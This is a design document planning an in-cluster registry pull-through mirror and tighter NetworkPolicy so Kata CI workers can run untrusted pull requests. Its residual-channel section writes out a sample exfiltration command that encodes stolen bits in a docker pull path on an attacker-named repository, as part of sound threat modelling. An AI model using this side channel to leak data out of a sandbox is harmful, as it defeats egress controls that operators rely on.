# Untrusted-PR Egress Posture for Kata Workers — Q408

> **Status (2026-07-31): design written; no phase implemented.** The Demand
> trigger fired (operator ask), moving [Q408](../STATUS.md#Q408) out of
> Deferred. Next step: Phase 0, the measured job-time egress inventory on a
> live Kata e2e run.

Design and phased plan for the posture named in
[Appendix G.14](../design/appendix-g-future-enhancements.md#g14-kata-e2e-untrusted-pr-posture--tight-egress--in-cluster-pull-through-mirror)
and on the [public roadmap](../roadmap.md#exploring--longer-term): make the
Kata worker variant safe for **untrusted / external-contributor pull-request
CI** by removing the workers' direct registry egress. Concretely: an
in-cluster **registry pull-through mirror** (the container-image sibling of
the Athens Go-module cache, Q244), job-side wiring so every image pull rides
it, and the deletion of the e2e tenant's additive open-egress NetworkPolicy.

**Scope statement — no controller or API changes.** Kata already bounds the
kernel-escape axis; the missing half is pure egress posture. The deliverable
is deploy manifests + wiring + docs + live validation, all in the
dogfood-e2e tree, published as the supported reference recipe
(`docs/operations/`). The GMC/AGC and the CRDs are untouched: GAG's managed
default-deny NetworkPolicy already gives exactly the right worker baseline
(below), and the mirror is operator-owned infrastructure like Athens — not a
product component.

---

## 1. Where the posture already stands

Most of the untrusted-PR story is shipped. Inventory of the existing
controls, so this plan only builds what is actually missing:

| Control | State |
|---|---|
| Kernel isolation | Kata micro-VM per worker; no `privileged: true` anywhere ([kata-dind-workloads.md](../operations/kata-dind-workloads.md)) |
| Managed worker egress | Default-deny; DNS (cluster resolver only, Q105/Q136/Q229) + tenant egress proxy — or GitHub CIDRs in the direct-egress form (`buildWorkloadNetworkPolicy`, `shared_networkpolicy.go`) |
| Worker ingress | Default-deny (Q128) |
| Metadata server | Workload Identity required + `automountServiceAccountToken: false`; with open egress gone, 169.254.169.254 is reachable on port 53 only (the link-local DNS rule), which the metadata service does not serve |
| Go modules | Athens in-cluster cache (Q244, [`deploy/athens/`](../../deploy/athens/)) — the pattern this plan copies: unlabelled cache pod keeps free egress, additive NetworkPolicy admits workload→cache, workers wired by env (`GOPROXY`) |
| Doctrine | [security-operations.md § Prefer an in-cluster caching mirror first](../operations/security-operations.md#prefer-an-in-cluster-caching-mirror-first) already names "a registry pull-through cache (container images)" as the recommended path — named but never built |

**The one opener:** the e2e overlays ship an additive `e2e-open-egress`
NetworkPolicy (`podSelector: {}`, allow-all egress —
[`deploy/dogfood-e2e/overlays/kata/resources.yaml`](../../deploy/dogfood-e2e/overlays/kata/resources.yaml))
because the suite pulls from CDN-fronted public registries. Q408 is the work
that lets us delete it from the Kata overlay.

## 2. The gap — what an e2e job pulls at job time

Only **in-job** traffic matters. The worker pod's own images (runner,
`docker:28-dind` sidecar) are pulled by the *node's* containerd, outside the
pod network namespace, and are not governed by the tenant NetworkPolicy.
Inside the job, three clients fetch over the pod's network:

1. **The inner `dockerd`** (Kata guest): `kindest/node`, images `docker
   build` FROMs, the local-registry container (`make e2e-registry`), the
   Vault test image.
2. **The inner kind cluster's containerd**: CNI images (`KIND_CNI=calico`),
   plus whatever the suite deploys that isn't pushed to the in-job local
   registry.
3. **Direct HTTP(S)**: `go` module fetches (already covered — the repo
   vendors, and dogfood wires Athens), possibly nothing else. Setup-time
   fetches (`get.helm.sh`, `quay.io` kata-deploy chart, image *builds*) run
   on trusted infra, not in the job.

Candidate upstream hosts: `docker.io` (registry-1.docker.io), `ghcr.io`,
`registry.k8s.io`, `quay.io`. **This list is a hypothesis.** Phase 0
replaces it with a measured inventory before any manifest is written
(CLAUDE.md: measure before asserting).

## 3. Design

### 3.1 The mirror — one pull-through cache per upstream

[CNCF Distribution](https://github.com/distribution/distribution)
(`registry:3`, digest-pinned at Phase 1) in **pull-through cache mode**
(`proxy.remoteurl`). Proxy mode supports exactly one upstream per instance,
so the deployment is one Deployment + ClusterIP Service per upstream host —
`mirror-docker-io`, `mirror-ghcr-io`, … — the final set fixed by Phase 0.
Properties that make it the right tool:

- **Read-only by construction.** A registry in proxy mode rejects pushes —
  untrusted code cannot use the mirror as a drop box.
- **Content control, not just host control.** Workers can speak only the
  registry protocol, only to the mirror, which fetches only from its one
  configured upstream. This is strictly stronger than any FQDN/CIDR
  allowlist of the upstreams themselves (§5).
- **Cache behavior.** Same trade as Athens: `emptyDir` default ($0 at rest,
  cold after scale-to-zero), a `persistent` overlay for a warm cache
  (`kindest/node` alone is ~1 GiB, so the PVC materially cuts job latency).

Manifests live at `deploy/registry-mirror/` shaped exactly like
`deploy/athens/` (base + persistent overlay + README), applied by the e2e
setup script. Like Athens, the mirror pods are **not** labelled
`actions-gateway/component=workload`, so the managed default-deny does not
select them and they keep free egress to their upstream; an additive
NetworkPolicy admits workload pods → mirror pods on the registry port, and
its own ingress rule admits only the worker namespace.

Transport is in-cluster plain HTTP (the standard local-mirror pattern; kind
and node-local registries do the same). The inner `dockerd` and containerd
get the mirror as an explicitly-schemed `http://` endpoint (plus
`insecure-registries` where a client insists). TLS via the tenant PKI is a
possible later hardening; it buys little here because image identity is
content-addressed for digest-pinned pulls, and the threat model this plan
closes is worker *egress*, not in-cluster MitM.

**Docker Hub rate limits** concentrate on the mirror's egress IP (shared NAT
today, so not a regression); if anonymous limits bite, `proxy.username` /
`proxy.password` with a token from the platform Secret is the escape hatch —
noted, not built.

**Digest integrity is unaffected by the mirror.** Schema-2/OCI digests are
pure content addressing — sha256 over the raw manifest and blob bytes, which
contain no registry hostname or repository name — so a pull-through cache
serving byte-identical upstream content preserves every digest. (The
"mirroring changes digests" folklore comes from the long-dead Docker schema-1
format, which embedded the repo name in the signed payload.) The repo already
depends on this property twice:
[air-gapped-install.md](../operations/air-gapped-install.md) relocates images
with `crane copy` digest-preserved, and
[p2p-image-distribution.md](../operations/p2p-image-distribution.md) routes
digest-pinned pulls through containerd mirrors. The consequence is favorable
for this plan: a digest-pinned pull re-verifies client-side, so even a
compromised mirror cannot substitute content — the mirror is trusted only for
tag→digest resolution, exactly as the upstream registry already was. Cosign
signatures key on the manifest digest, not the pull location, so verification
through the mirror also holds.

### 3.2 Wiring the three clients

- **Inner dockerd** (Kata overlay dind sidecar `args`): add
  `--registry-mirror=http://mirror-docker-io.<ns>.svc.cluster.local:5000`.
  This transparently covers every Docker-Hub pull, implicit or explicit.
  `dockerd` mirrors **only** Docker Hub — a job-time `docker pull
  ghcr.io/...` cannot be transparently redirected. Phase 0 determines
  whether any non-Hub docker-client pull exists at job time; if so, the ref
  is rewritten to the mirror address (`mirror-ghcr-io:5000/owner/img`) at
  its call site, which pull-through mode serves natively.
- **Inner kind containerd** (`test/kind-config-*.yaml`):
  `containerdConfigPatches` registry-mirror entries mapping each upstream
  host to its mirror Service. containerd handles per-host mirrors properly,
  so kind-side pulls (calico, anything not in the local registry) all
  redirect. The kind configs also serve local `make e2e` outside the
  cluster, so the mirror entries must be additive-with-fallback (containerd
  falls back to the upstream when the mirror is unreachable) or selected via
  an env-gated config — Phase 2 decides after measuring which pulls actually
  ride kind.
- **Go**: already closed — the repo builds with the committed `vendor/`
  tree, and the dogfood tenant wires `GOPROXY` to Athens (Q244).

### 3.3 The NetworkPolicy swap

In the **Kata overlay only**: delete `e2e-open-egress`, add
`e2e-mirror-egress` — workload pods → mirror pods, registry port only. The
managed default-deny stays authoritative for everything else (DNS + proxy /
GitHub). The dind overlay keeps open egress: it is the explicit trusted-CI
fallback (`E2E_VARIANT=dind`), and privileged DinD was never a candidate for
untrusted code anyway.

Result: the Kata worker's complete reachable set is **cluster DNS (:53) +
GitHub (via the managed rule) + the mirror set**. Nothing else, including
the metadata server on its service ports.

### 3.4 Residual channels, stated honestly

- **GitHub via the managed rule** — inherent to running GitHub CI (job code
  can always write to its own repo/gists through sanctioned channels). The
  Q242 destination allowlist and per-tenant egress-IP attribution govern
  this; out of scope here.
- **Pull-name side channel** — a malicious job may `docker pull
  docker.io/attacker/<encoded-bits>`; the mirror forwards that request
  upstream, leaking low-bandwidth data via the requested path, and pulls
  attacker-published content in. Accepted: the channel is narrow, fully
  auditable at one point (the mirror's access log), and closable later with
  a repository allowlist in front of the mirror if a real deployment wants
  it. The same audit point simply does not exist with direct registry
  egress.
- **DNS names still recurse upstream** via cluster DNS — the established
  Q105 stance (attributable path); unchanged.

### 3.5 The mirror role is a contract

What the posture actually requires is not "CNCF Distribution" but an
endpoint with four properties:

1. **Selectable by NetworkPolicy** — a stable pod identity a `podSelector`
   can name (rules out `hostNetwork` daemons, which force node-CIDR
   `ipBlock` allows).
2. **Fixed upstream set** — the endpoint fetches only from its configured
   upstream(s), never from whatever registry the client names.
3. **Read-only** — pushes and other non-GET registry operations are
   refused, not forwarded.
4. **Workers are clients only** — untrusted pods consume the endpoint; they
   never join whatever distribution mesh sits behind it.

Distribution's proxy mode satisfies all four **by construction**, which is
why it is the reference implementation. Any backend meeting the same four
tests can substitute — Dragonfly is the scheduled candidate ([§6](#6-follow-on-validations-q539-q540)).

## 4. Phases

Each phase is a separate PR; 0 and 3 need live dogfood sessions
(prod-guarded — deliberate, operator-driven runs).

- **Phase 0 — measured egress inventory.** On a green Kata e2e run (open
  egress still in place), enumerate the actual job-time pull set:
  `docker images --digests` in the guest + `crictl images` in the kind
  nodes after the suite, cross-checked against suite logs. Deliverable: a
  table in §2 replacing the hypothesis — hosts, images, and which client
  (dockerd vs kind containerd) fetched each.
- **Phase 1 — mirror manifests.** `deploy/registry-mirror/` (Athens-shaped:
  base, persistent overlay, README, NetworkPolicies), one instance per
  Phase-0 host, applied from the e2e setup path. Validation: apply to the
  dogfood cluster; `curl` the mirror's `/v2/` and pull one image through
  each instance from a debug pod.
- **Phase 2 — wiring.** dockerd `--registry-mirror` in the Kata overlay;
  kind `containerdConfigPatches`; any non-Hub docker-client refs rewritten.
  Validation: a green Kata e2e run **with open egress still present**, with
  the mirror access logs proving the pulls rode the mirror (hit counts >
  0 per instance) — wiring proven before enforcement changes.
- **Phase 3 — enforcement.** Swap `e2e-open-egress` → `e2e-mirror-egress`
  in the Kata overlay. Validation on dogfood: (a) a green Kata e2e run
  under the tight policy; (b) negatives from inside a job — `docker pull`
  of a host with no mirror instance fails, `curl https://example.com`
  times out, a push to the mirror is refused; (c) kind-side pull of a
  non-local-registry image succeeds via the mirror.
- **Phase 4 — docs + close-out.**
  [kata-dind-workloads.md](../operations/kata-dind-workloads.md) caveat
  "validated posture is trusted CI" flips to the how-to;
  [security-operations.md](../operations/security-operations.md) mirror
  section links the concrete manifests;
  [in-runner image builds](../operations/in-runner-image-builds.md) and
  [network-architecture.md](../design/network-architecture.md) cross-refs;
  G.14 marked shipped; [roadmap.md](../roadmap.md) entry moves out of
  "exploring"; Q408 row deleted.

## 5. Alternatives considered

- **FQDN allowlist of the upstream registries** (Q245 machinery). Rejected
  on three axes: the dogfood cluster does not run
  `--enable-fqdn-network-policy`, and the GMC's FQDN backends target the
  *proxy pool's GitHub* allowlist, not arbitrary tenant-namespace policies;
  CDN-fronted hosts stress the DPv2 wildcard 50-IP ceiling (the one
  unstressed Q245 caveat); and above all it is host-scoped, not
  content-scoped — `docker.io` allowlisted is `docker.io/<anyone>/<anything>`
  in both directions, i.e. the exfil surface stays open. The mirror gives a
  single auditable chokepoint instead.
- **Spegel / Dragonfly P2P mirrors as the first implementation**
  ([p2p-image-distribution.md](../operations/p2p-image-distribution.md)).
  Their native layer is the **node's** containerd — pod-image distribution,
  which the tenant NetworkPolicy never governs — and Spegel only re-serves
  images already in the cluster's content store, so neither addresses the
  in-guest pulls as installed. Dragonfly *can* be configured into the §3.5
  mirror contract (seed-peer Service rather than the `hostNetwork`
  dfdaemon, an explicit upstream allowlist, non-GET refused), but that is
  hardening a manager + scheduler + seed-peer + per-node-daemon stack to
  reach a property one stateless Deployment has by construction — so it is
  sequenced as a follow-on validation ([§6](#6-follow-on-validations-q539-q540)),
  not the reference posture.
- **Harbor / zot.** Harbor is a full registry product (DB, core, jobservice)
  — heavy for a cache; zot's mirroring is sync-rule-shaped rather than a
  plain per-upstream pull-through. Distribution's proxy mode is the boring,
  proven primitive, and it is what `security-operations.md` already
  recommends.
- **Routing registry traffic through the tenant egress proxy** (widened
  Q242 allowlist). Host-scoped only (same exfil objection as FQDN), mixes
  bulk image traffic into the GitHub-attribution egress path, and buys no
  caching.

## 6. Follow-on validations (Q539, Q540)

Decision 2026-07-31: both alternates get validated, sequenced **after** this
plan's Phase 3 proves the reference posture — the contract must be validated
on the simple implementation before variants are graded against it.

- **[Q539](../STATUS.md#Q539) — Kata + Dragonfly as the mirror backend.**
  Substitute a Dragonfly deployment for the Distribution instances behind
  the same wiring and the same tight NetworkPolicy, and prove it meets the
  §3.5 contract: workers reach only a seed-peer ClusterIP Service (the
  `hostNetwork` dfdaemon is not policy-selectable), back-to-source is
  restricted to the Phase-0 upstream allowlist, non-GET registry operations
  are refused, and workers never participate in the P2P mesh. Same Phase-3
  validation battery, plus negatives for the contract points. Needs its own
  plan doc when picked up.
- **[Q540](../STATUS.md#Q540) — the composed stack as a milestone: Kata +
  Dragonfly (node layer) + pull-through cache (guest layer).** The two
  operate at different layers (§5), so this validates the composition an
  image-heavy fleet would actually run: Dragonfly accelerating node-level
  pod-image distribution via containerd mirror config, the in-guest mirror
  serving untrusted job pulls, each with its own policy scope — and
  confirms neither weakens the other's posture (in particular that the
  node-layer P2P mesh stays unreachable from worker pods).

## 7. Success criteria

Q408 closes when the Phase 3 validation lands: the dogfood Kata e2e variant
runs green with `e2e-open-egress` deleted, the negative probes confirm
enforcement, and the Phase 4 docs make the recipe the supported posture. At
that point "Kata-isolated runners are only suitable for trusted CI"
disappears from the docs, replaced by the reference architecture for
untrusted-PR CI.
